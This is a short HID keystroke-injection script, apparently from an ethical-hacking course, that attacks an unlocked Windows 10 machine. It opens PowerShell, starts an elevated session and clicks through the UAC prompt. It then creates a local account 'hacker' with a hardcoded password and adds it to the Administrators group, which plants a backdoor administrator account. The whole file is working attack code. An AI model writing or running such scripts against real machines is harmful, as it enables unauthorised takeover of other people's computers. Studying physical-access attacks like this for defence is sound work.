// Aashish Aryal
// A HID script to create a new user for attacker and add it to the Administrators group in Windows 10
// This script is to be run from attacker's machine on target machine

layout("US")
delay(2000)
press("GUI r") // Open Run dialog
delay(1000)
type("powershell") // Run PowerShell
press("ENTER")
delay(2000)
type("Start-Process powershell -Verb runAs") // Run PowerShell as administrator
press("ENTER")
delay(2500)
press("LEFT")
delay(1000)
press("ENTER")
delay(1000)
type("New-LocalUser -Name 'hacker' -Password (ConvertTo-SecureString 'hacker123' -AsPlainText -Force) -FullName 'SIT704 Ethical Hacker' -Description 'User for ethical hacker'") // Create new local user
press("ENTER")
delay(1000)
type("Add-LocalGroupMember -Group 'Administrators' -Member 'hacker'")  // Add user to Administrators group
press("ENTER")
delay(1000)
type("exit")
press("ENTER")
delay(1000)
type("exit")
press("ENTER")
